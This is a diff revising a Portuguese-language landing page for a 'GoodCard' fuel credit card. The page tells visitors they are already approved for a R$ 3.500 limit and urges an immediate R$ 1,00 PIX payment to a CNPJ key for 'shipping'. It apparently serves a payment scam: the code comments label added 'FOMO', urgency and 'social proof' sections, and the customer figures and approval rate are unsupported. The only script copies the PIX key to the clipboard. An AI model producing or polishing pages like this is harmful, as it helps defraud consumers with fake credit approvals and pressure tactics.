@@ -1,10 +1,10 @@
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GoodCard - Aprovação</title>
+  <title>GoodCard - Parabéns! Você foi aprovado</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/lucide@latest"></script>
   <script>
     tailwind.config = {
       theme: {
@@ -13,260 +13,333 @@
             'goodcard-orange': '#FF6B35',
             'goodcard-navy': '#1A2B4C',
             'goodcard-gray': '#F5F7FA',
-            'goodcard-green': '#10B981',
+            'goodcard-green': '#10B981'
           }
         }
       }
     }
   </script>
   <style>
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    @keyframes fade-in {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
-    .animate-fade-in { 
-      animation: fadeIn 0.6s ease-out; 
+    .animate-fade-in {
+      animation: fade-in 0.8s ease-out forwards;
     }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: .5; }
+    @keyframes pulse-soft {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
     }
-    .animate-pulse { 
-      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; 
+    .animate-pulse-soft {
+      animation: pulse-soft 2s ease-in-out infinite;
+    }
+    .delay-100 {
+      animation-delay: 0.1s;
+    }
+    .delay-200 {
+      animation-delay: 0.2s;
+    }
+    .delay-300 {
+      animation-delay: 0.3s;
     }
   </style>
 </head>
-<body>
-  <div class="min-h-screen bg-white">
-    <!-- CABEÇALHO -->
-    <header class="fixed top-0 left-0 right-0 bg-white shadow-sm z-50">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
-        <div class="flex items-center gap-3">
-          <div class="text-2xl font-bold text-goodcard-orange">GoodCard</div>
-          <div class="text-sm text-goodcard-navy">Cartão de Crédito para Combustível</div>
-        </div>
-      </div>
-    </header>
+<body class="min-h-screen bg-white">
 
-    <!-- SEÇÃO HERO - APROVAÇÃO -->
-    <section class="pt-24 pb-12 bg-gradient-to-br from-orange-50 to-orange-100">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="text-center animate-fade-in">
-          <div class="flex justify-center mb-6">
-            <i data-lucide="check-circle-2" class="w-24 h-24 text-goodcard-green animate-pulse"></i>
+  <!-- HEADER -->
+  <header class="bg-white shadow-sm py-6">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <h1 class="text-4xl sm:text-5xl font-bold text-goodcard-orange text-center">
+        GoodCard
+      </h1>
+    </div>
+  </header>
+
+  <!-- HERO - APROVAÇÃO -->
+  <section class="py-16 bg-gradient-to-br from-orange-50 to-white">
+    <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center animate-fade-in">
+        <!-- Ícone de Check -->
+        <div class="flex justify-center mb-8">
+          <div class="bg-goodcard-green/10 rounded-full p-6 animate-pulse-soft">
+            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="text-goodcard-green">
+              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+              <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            </svg>
           </div>
-          <h1 class="text-3xl sm:text-4xl lg:text-5xl font-bold text-goodcard-navy mb-4">
-            Parabéns! Sua análise foi concluída
-          </h1>
-          <p class="text-xl sm:text-2xl text-goodcard-navy opacity-80">
-            Você foi aprovado para o cartão GoodCard Combustível
+        </div>
+        
+        <!-- Título Principal -->
+        <h2 class="text-3xl sm:text-4xl lg:text-5xl font-bold text-goodcard-navy mb-6 leading-tight">
+          Parabéns! Seu cartão<br>GoodCard foi aprovado
+        </h2>
+        
+        <!-- Subtítulo com FOMO -->
+        <p class="text-lg sm:text-xl text-goodcard-navy/80 max-w-2xl mx-auto leading-relaxed">
+          Seu limite de <span class="font-bold text-goodcard-orange">R$ 3.500</span> está reservado. Pague <span class="font-bold">R$ 1,00</span> agora e garanta o despache do seu cartão <span class="font-bold">hoje mesmo</span> para sua residência.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- BENEFÍCIOS - 3 CARDS -->
+  <section class="py-16 bg-goodcard-gray">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+        
+        <!-- Card 1 - Cartão Físico -->
+        <div class="bg-white rounded-2xl shadow-lg p-8 hover:shadow-xl transition-all duration-300 hover:scale-105 animate-fade-in">
+          <div class="flex justify-center mb-6">
+            <div class="bg-goodcard-green/10 rounded-full p-5">
+              <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-goodcard-green">
+                <rect width="20" height="14" x="2" y="5" rx="2"/>
+                <line x1="2" x2="22" y1="10" y2="10"/>
+              </svg>
+            </div>
+          </div>
+          <h3 class="text-2xl font-bold text-goodcard-navy mb-3 text-center">
+            Cartão Físico
+          </h3>
+          <p class="text-goodcard-navy/70 text-center leading-relaxed">
+            Aceito em qualquer posto do país, sem restrições
+          </p>
+        </div>
+
+        <!-- Card 2 - Sem Anuidade -->
+        <div class="bg-white rounded-2xl shadow-lg p-8 hover:shadow-xl transition-all duration-300 hover:scale-105 animate-fade-in delay-100">
+          <div class="flex justify-center mb-6">
+            <div class="bg-goodcard-green/10 rounded-full p-5">
+              <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-goodcard-green">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="m4.9 4.9 14.2 14.2"/>
+              </svg>
+            </div>
+          </div>
+          <h3 class="text-2xl font-bold text-goodcard-navy mb-3 text-center">
+            Zero Anuidade
+          </h3>
+          <p class="text-goodcard-navy/70 text-center leading-relaxed">
+            Nenhuma tarifa anual. Você só paga o que gastar
+          </p>
+        </div>
+
+        <!-- Card 3 - Vencimento -->
+        <div class="bg-white rounded-2xl shadow-lg p-8 hover:shadow-xl transition-all duration-300 hover:scale-105 animate-fade-in delay-200">
+          <div class="flex justify-center mb-6">
+            <div class="bg-goodcard-green/10 rounded-full p-5">
+              <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-goodcard-green">
+                <rect width="18" height="18" x="3" y="4" rx="2" ry="2"/>
+                <line x1="16" x2="16" y1="2" y2="6"/>
+                <line x1="8" x2="8" y1="2" y2="6"/>
+                <line x1="3" x2="21" y1="10" y2="10"/>
+              </svg>
+            </div>
+          </div>
+          <h3 class="text-2xl font-bold text-goodcard-navy mb-3 text-center">
+            Você Escolhe o Vencimento
+          </h3>
+          <p class="text-goodcard-navy/70 text-center leading-relaxed">
+            Defina a melhor data após ativar o cartão
+          </p>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- SEÇÃO ENVIO -->
+  <section class="py-16 bg-white">
+    <div class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="bg-gradient-to-br from-orange-50 to-white border-2 border-goodcard-orange/20 rounded-2xl shadow-xl p-10 animate-fade-in delay-300">
+        <h2 class="text-3xl font-bold text-goodcard-navy mb-8 text-center">
+          Receba seu cartão em casa
+        </h2>
+        
+        <div class="space-y-4 text-lg text-goodcard-navy">
+          <div class="flex items-start gap-4">
+            <span class="text-2xl">💳</span>
+            <p><span class="font-bold">Taxa única de envio:</span> R$ 1,00</p>
+          </div>
+          <div class="flex items-start gap-4">
+            <span class="text-2xl">📦</span>
+            <p><span class="font-bold">Prazo de entrega:</span> até 7 dias úteis</p>
+          </div>
+          <div class="flex items-start gap-4">
+            <span class="text-2xl">📍</span>
+            <p><span class="font-bold">Enviamos para todo o Brasil</span></p>
+          </div>
+        </div>
+
+        <!-- Urgência -->
+        <div class="mt-8 bg-goodcard-orange/10 border-l-4 border-goodcard-orange rounded-lg p-4">
+          <p class="text-goodcard-navy font-semibold flex items-center gap-2">
+            <span class="text-xl">⚡</span>
+            Pagamentos confirmados até 12h são despachados no mesmo dia
           </p>
         </div>
       </div>
-    </section>
+    </div>
+  </section>
 
-    <!-- SEÇÃO LIMITE -->
-    <section class="py-12 bg-white">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="max-w-2xl mx-auto">
-          <div class="bg-white border-4 border-goodcard-orange rounded-xl shadow-lg p-8 text-center animate-fade-in">
-            <div class="text-5xl sm:text-6xl font-bold text-goodcard-orange mb-4">
-              R$ 3.500,00
-            </div>
-            <p class="text-xl text-goodcard-navy font-semibold">
-              Válido em TODOS os postos do Brasil
-            </p>
-            <div class="flex justify-center gap-4 mt-6">
-              <div class="w-16 h-10 bg-red-600 rounded flex items-center justify-center text-white text-xs font-bold">
-                SHELL
-              </div>
-              <div class="w-16 h-10 bg-yellow-500 rounded flex items-center justify-center text-white text-xs font-bold">
-                IPIRANGA
-              </div>
-              <div class="w-20 h-10 bg-blue-800 rounded flex items-center justify-center text-white text-xs font-bold">
-                PETROBRAS
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+  <!-- CTA PIX - CONVERSÃO PRINCIPAL -->
+  <section class="py-16 bg-goodcard-gray">
+    <div class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="bg-gradient-to-br from-goodcard-orange to-orange-600 rounded-3xl shadow-2xl p-10 sm:p-12 animate-fade-in">
+        
+        <!-- Título CTA -->
+        <h2 class="text-3xl sm:text-4xl font-bold text-white mb-8 text-center">
+          Falta só isso: copie a chave<br class="sm:hidden"> e pague via PIX
+        </h2>
 
-    <!-- SEÇÃO BENEFÍCIOS -->
-    <section class="py-12 bg-goodcard-gray">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-          <!-- Card 1 - Cartão Físico -->
-          <div class="bg-white rounded-xl shadow-lg p-6 hover:shadow-xl transition-shadow animate-fade-in">
-            <div class="flex justify-center mb-4">
-              <div class="bg-goodcard-green bg-opacity-10 rounded-full p-4">
-                <i data-lucide="credit-card" class="w-8 h-8 text-goodcard-green"></i>
-              </div>
-            </div>
-            <h3 class="text-xl font-bold text-goodcard-navy mb-2 text-center">
-              Cartão Físico
-            </h3>
-            <p class="text-goodcard-navy opacity-70 text-center">
-              Seu cartão é físico e aceito em qualquer bomba de combustível do país
-            </p>
-          </div>
+        <!-- Botão Copiar PIX -->
+        <button
+          id="copyPixButton"
+          class="w-full bg-white text-goodcard-orange rounded-xl font-bold text-xl sm:text-2xl py-6 px-8 flex items-center justify-center gap-4 hover:bg-gray-50 hover:scale-105 transition-all duration-300 shadow-xl mb-6"
+        >
+          <svg id="copyIcon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect width="14" height="14" x="8" y="8" rx="2" ry="2"/>
+            <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>
+          </svg>
+          <svg id="checkIcon" class="hidden" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+          <span id="buttonText">COPIAR CHAVE PIX</span>
+        </button>
 
-          <!-- Card 2 - Sem Anuidade -->
-          <div class="bg-white rounded-xl shadow-lg p-6 hover:shadow-xl transition-shadow animate-fade-in">
-            <div class="flex justify-center mb-4">
-              <div class="bg-goodcard-green bg-opacity-10 rounded-full p-4">
-                <i data-lucide="ban" class="w-8 h-8 text-goodcard-green"></i>
-              </div>
-            </div>
-            <h3 class="text-xl font-bold text-goodcard-navy mb-2 text-center">
-              Sem Anuidade
-            </h3>
-            <p class="text-goodcard-navy opacity-70 text-center">
-              Você não paga nada para manter seu cartão ativo. Zero tarifas anuais
-            </p>
-          </div>
-
-          <!-- Card 3 - Você Define a Data -->
-          <div class="bg-white rounded-xl shadow-lg p-6 hover:shadow-xl transition-shadow animate-fade-in">
-            <div class="flex justify-center mb-4">
-              <div class="bg-goodcard-green bg-opacity-10 rounded-full p-4">
-                <i data-lucide="calendar" class="w-8 h-8 text-goodcard-green"></i>
-              </div>
-            </div>
-            <h3 class="text-xl font-bold text-goodcard-navy mb-2 text-center">
-              Você Define a Data
-            </h3>
-            <p class="text-goodcard-navy opacity-70 text-center">
-              Escolha o melhor dia de fechamento da fatura após desbloquear seu cartão no app
-            </p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SEÇÃO ENVIO -->
-    <section class="py-12 bg-white">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="max-w-2xl mx-auto">
-          <div class="bg-white border-2 border-goodcard-orange border-opacity-30 rounded-xl shadow-lg p-8 animate-fade-in">
-            <div class="flex items-start gap-4">
-              <div class="bg-goodcard-orange bg-opacity-10 rounded-full p-3">
-                <i data-lucide="truck" class="w-8 h-8 text-goodcard-orange"></i>
-              </div>
-              <div class="flex-1">
-                <h2 class="text-2xl font-bold text-goodcard-navy mb-4">
-                  Receba seu cartão em casa
-                </h2>
-                <p class="text-lg text-goodcard-navy mb-2">
-                  Faça o pagamento de apenas <span class="font-bold text-goodcard-orange">R$ 1,00</span> para despacho/envio
-                </p>
-                <p class="text-lg text-goodcard-navy font-semibold">
-                  Receba em até <span class="text-goodcard-orange">7 dias úteis</span>, independente do seu estado!
-                </p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SEÇÃO PIX - CTA PRINCIPAL -->
-    <section class="py-12 bg-goodcard-gray">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="max-w-2xl mx-auto">
-          <div class="bg-goodcard-orange rounded-xl shadow-xl p-8 text-center animate-fade-in">
-            <h2 class="text-2xl sm:text-3xl font-bold text-white mb-6">
-              Garanta seu cartão agora
-            </h2>
-            <button
-              id="pixButton"
-              class="w-full sm:w-auto px-8 py-4 bg-white text-goodcard-orange rounded-lg font-bold text-lg flex items-center justify-center gap-3 mx-auto hover:bg-gray-100 transition-colors shadow-lg"
-            >
-              <i data-lucide="copy" class="w-6 h-6"></i>
-              <span id="pixButtonText">COPIAR CHAVE PIX</span>
-            </button>
-            <p id="pixMessage" class="mt-4 text-white font-semibold animate-fade-in hidden">
-              Chave copiada! Abra seu banco → PIX → CNPJ
-            </p>
-            <div class="mt-6 pt-6 border-t border-white border-opacity-30">
-              <p class="text-white opacity-90 text-sm mb-2">Chave PIX (CNPJ):</p>
-              <p class="text-white text-xl font-mono font-bold">
-                10.956.143/0001-25
-              </p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- DADOS DO PAGAMENTO -->
-    <section class="py-8 bg-white">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="max-w-2xl mx-auto">
-          <div class="bg-goodcard-gray rounded-lg p-6">
-            <p class="text-sm text-goodcard-navy opacity-70 mb-2">Dados que aparecerão no PIX:</p>
-            <div class="space-y-1 text-sm text-goodcard-navy">
-              <p><span class="font-semibold">Nome:</span> GOOD CARD</p>
-              <p><span class="font-semibold">CNPJ:</span> 10.956.143/0001-25</p>
-              <p><span class="font-semibold">Instituição:</span> Itaú Unibanco S.A.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- RODAPÉ -->
-    <footer class="py-6 bg-goodcard-navy">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <p class="text-center text-white opacity-80 text-sm">
-          GoodCard © 2026 - Cartão de Crédito para Combustível
+        <!-- Mensagem após copiar -->
+        <p id="copiedMessage" class="text-white text-center font-semibold text-lg mb-8 hidden animate-fade-in">
+          ✓ Chave copiada!<br>
+          Agora abra seu app do banco → PIX → Cole a chave
         </p>
+
+        <!-- Box da Chave PIX -->
+        <div class="bg-white/20 backdrop-blur-sm rounded-xl p-6 mb-6">
+          <p class="text-white/90 text-sm mb-2 text-center">Chave PIX (CNPJ):</p>
+          <p class="text-white text-2xl sm:text-3xl font-mono font-bold text-center tracking-wider">
+            10.956.143/0001-25
+          </p>
+        </div>
+
+        <!-- Micro-copy de segurança -->
+        <div class="space-y-2 text-white/90 text-center">
+          <p class="flex items-center justify-center gap-2">
+            <span>🔒</span> Pagamento seguro via PIX
+          </p>
+          <p class="flex items-center justify-center gap-2">
+            <span>⚡</span> Confirmação instantânea
+          </p>
+          <p class="flex items-center justify-center gap-2">
+            <span>📦</span> Despachamos assim que identificarmos o pagamento
+          </p>
+        </div>
+
       </div>
-    </footer>
-  </div>
+    </div>
+  </section>
+
+  <!-- DADOS DO PAGAMENTO -->
+  <section class="py-12 bg-white">
+    <div class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="bg-goodcard-gray rounded-2xl p-8 shadow-lg">
+        <p class="text-goodcard-navy/70 text-sm mb-4 font-semibold">📋 Dados que aparecerão no PIX:</p>
+        <div class="space-y-2 text-goodcard-navy mb-6">
+          <p><span class="font-semibold">Nome:</span> GOOD CARD</p>
+          <p><span class="font-semibold">CNPJ:</span> 10.956.143/0001-25</p>
+          <p><span class="font-semibold">Instituição:</span> Itaú Unibanco S.A.</p>
+          <p><span class="font-semibold">Valor:</span> R$ 1,00</p>
+        </div>
+
+        <!-- Aviso Importante -->
+        <div class="bg-yellow-50 border-l-4 border-yellow-400 rounded-lg p-4">
+          <p class="text-yellow-800 font-bold mb-1">⚠️ IMPORTANTE</p>
+          <p class="text-yellow-700 text-sm">O pagamento deve ser de exatamente <span class="font-bold">R$ 1,00</span></p>
+          <p class="text-yellow-700 text-sm">Pagamentos com valores diferentes não serão processados</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PROVA SOCIAL -->
+  <section class="py-12 bg-goodcard-gray">
+    <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="bg-white rounded-2xl shadow-lg p-8 sm:p-10">
+        <div class="space-y-4 text-goodcard-navy">
+          <p class="flex items-start gap-3 text-lg">
+            <span class="text-goodcard-green text-2xl">✓</span>
+            <span>Mais de <span class="font-bold">50.000 brasileiros</span> já receberam o GoodCard</span>
+          </p>
+          <p class="flex items-start gap-3 text-lg">
+            <span class="text-goodcard-green text-2xl">✓</span>
+            <span>Enviamos cartões para <span class="font-bold">todos os estados</span></span>
+          </p>
+          <p class="flex items-start gap-3 text-lg">
+            <span class="text-goodcard-green text-2xl">✓</span>
+            <span>Taxa de aprovação de <span class="font-bold">98% no desbloqueio</span></span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RODAPÉ -->
+  <footer class="py-8 bg-goodcard-navy">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <p class="text-center text-white/80 text-sm">
+        GoodCard © 2026 - Cartão de Crédito para Combustível
+      </p>
+    </div>
+  </footer>
 
   <script>
-    // Inicializar ícones do Lucide
-    lucide.createIcons();
-
-    // Função para copiar chave PIX
-    const pixButton = document.getElementById('pixButton');
-    const pixButtonText = document.getElementById('pixButtonText');
-    const pixMessage = document.getElementById('pixMessage');
-    const pixKey = '10956143000125';
-
-    pixButton.addEventListener('click', function() {
-      // Copiar para clipboard
+    document.getElementById('copyPixButton').addEventListener('click', function() {
+      const pixKey = '10956143000125';
+      const button = this;
+      const buttonText = document.getElementById('buttonText');
+      const copyIcon = document.getElementById('copyIcon');
+      const checkIcon = document.getElementById('checkIcon');
+      const copiedMessage = document.getElementById('copiedMessage');
+      
       navigator.clipboard.writeText(pixKey).then(function() {
-        // Mudar texto do botão
-        pixButtonText.textContent = 'Chave Copiada!';
+        // Mudar visual do botão
+        button.classList.remove('bg-white', 'text-goodcard-orange');
+        button.classList.add('bg-goodcard-green', 'text-white');
         
-        // Mudar cor do botão
-        pixButton.classList.remove('bg-white', 'text-goodcard-orange', 'hover:bg-gray-100');
-        pixButton.classList.add('bg-goodcard-green', 'text-white');
+        // Trocar ícone
+        copyIcon.classList.add('hidden');
+        checkIcon.classList.remove('hidden');
+        
+        // Mudar texto
+        buttonText.textContent = 'Chave Copiada!';
         
         // Mostrar mensagem
-        pixMessage.classList.remove('hidden');
+        copiedMessage.classList.remove('hidden');
         
-        // Mudar ícone
-        const icon = pixButton.querySelector('i');
-        icon.setAttribute('data-lucide', 'check');
-        lucide.createIcons();
-        
-        // Resetar após 3 segundos
+        // Voltar ao normal após 4 segundos
         setTimeout(function() {
-          pixButtonText.textContent = 'COPIAR CHAVE PIX';
-          pixButton.classList.remove('bg-goodcard-green', 'text-white');
-          pixButton.classList.add('bg-white', 'text-goodcard-orange', 'hover:bg-gray-100');
-          pixMessage.classList.add('hidden');
-          icon.setAttribute('data-lucide', 'copy');
-          lucide.createIcons();
-        }, 3000);
+          button.classList.remove('bg-goodcard-green', 'text-white');
+          button.classList.add('bg-white', 'text-goodcard-orange');
+          copyIcon.classList.remove('hidden');
+          checkIcon.classList.add('hidden');
+          buttonText.textContent = 'COPIAR CHAVE PIX';
+          copiedMessage.classList.add('hidden');
+        }, 4000);
       }).catch(function(err) {
         console.error('Erro ao copiar:', err);
-        alert('Erro ao copiar chave PIX. Por favor, copie manualmente: ' + pixKey);
+        alert('Não foi possível copiar. Por favor, copie manualmente: 10956143000125');
       });
     });
   </script>
+
 </body>
 </html>
